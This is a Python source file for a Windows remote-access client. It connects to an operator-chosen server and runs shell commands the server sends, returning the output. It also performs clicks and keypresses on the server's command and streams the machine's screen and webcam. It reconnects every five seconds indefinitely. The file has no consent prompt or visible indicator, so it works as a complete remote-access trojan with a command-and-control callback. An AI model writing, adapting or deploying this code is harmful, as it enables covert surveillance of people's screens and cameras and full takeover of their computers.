import os, subprocess, threading, base64, time, socket, platform
import socketio, pyautogui, cv2, numpy as np

# Change this to match your server's IP and the port you chose at startup
SERVER_URL = "http://your_ip:8888" 
sio = socketio.Client()

# Failsafe off so the cursor can reach the very edges for click mapping
pyautogui.FAILSAFE = False
SCREEN_SIZE = pyautogui.size()

FLAGS = {"screen": False, "cam": False}

# Mapping browser JS key names to PyAutoGUI key names
KEY_MAP = {
    "Control": "ctrl", "Meta": "win", "Alt": "alt", "Shift": "shift",
    "Enter": "enter", "Backspace": "backspace", "Escape": "esc", "Tab": "tab",
    " ": "space", "ArrowUp": "up", "ArrowDown": "down", "ArrowLeft": "left", "ArrowRight": "right"
}

@sio.on('connect')
def on_connect():
    sio.emit('register_client', {
        'name': f"{platform.node()} [Windows]",
        'ip': socket.gethostbyname(socket.gethostname())
    })
    print("[*] Handshake Complete. Linked to SoggaBoard.")

@sio.on('dispatch')
def on_dispatch(data):
    global FLAGS
    action = data.get('action')

    # 1. WINDOWS CMD EXECUTION
    if action == 'shell':
        def run_cmd():
            try:
                # Using shell=True for internal commands like 'dir' or 'echo'
                # stdin=subprocess.DEVNULL prevents the process from hanging on input prompts
                proc = subprocess.Popen(data['data'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
                stdout, stderr = proc.communicate(timeout=15)
                output = stdout.decode('cp1252', errors='replace') + stderr.decode('cp1252', errors='replace')
                sio.emit('shell_response', {'output': output if output.strip() else "Command executed."})
            except Exception as e:
                sio.emit('shell_response', {'output': f"WIN_ERR: {str(e)}"})
        
        # Run shell in a separate thread so it doesn't freeze the whole client
        threading.Thread(target=run_cmd, daemon=True).start()

    # 2. REMOTE CONTROL
    elif action == 'click':
        target_x = int(data['x'] * SCREEN_SIZE.width)
        target_y = int(data['y'] * SCREEN_SIZE.height)
        pyautogui.click(target_x, target_y)

    elif action == 'keypress':
        key = data['key']
        pyautogui.press(KEY_MAP.get(key, key.lower()))

    # 3. STREAMING ENGINE
    elif action == 'start_share':
        FLAGS["cam"] = False 
        time.sleep(0.2)
        if not FLAGS["screen"]:
            FLAGS["screen"] = True
            threading.Thread(target=screen_streamer, daemon=True).start()
    
    elif action == 'stop_share':
        FLAGS["screen"] = False
    
    elif action == 'start_webcam':
        FLAGS["screen"] = False
        time.sleep(0.2)
        if not FLAGS["cam"]:
            FLAGS["cam"] = True
            threading.Thread(target=cam_streamer, daemon=True).start()
            
    elif action == 'stop_webcam':
        FLAGS["cam"] = False

def screen_streamer():
    """High-speed screen capture with cursor rendering."""
    while FLAGS["screen"]:
        try:
            # Taking the shot
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            
            # Render a custom cursor dot since pyautogui.screenshot() hides the real one
            mx, my = pyautogui.position()
            cv2.circle(frame, (mx, my), 6, (0, 0, 255), -1) 
            
            # Encode and transmit
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 45])
            sio.emit('frame_data', {'frame': base64.b64encode(buffer).decode(), 'type': 'screen'})
            
            # Control the frame rate to prevent network saturation
            time.sleep(0.04) 
        except:
            break

def cam_streamer():
    """Windows DirectShow Webcam Capture."""
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) # CAP_DSHOW is faster on Windows
    while FLAGS["cam"]:
        ret, frame = cap.read()
        if not ret: break
        
        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 40])
        sio.emit('frame_data', {'frame': base64.b64encode(buffer).decode(), 'type': 'webcam'})
        time.sleep(0.06)
    cap.release()

if __name__ == "__main__":
    while True:
        try:
            if not sio.connected:
                sio.connect(SERVER_URL)
            sio.wait()
        except:
            time.sleep(5) # Retry connection every 5 seconds
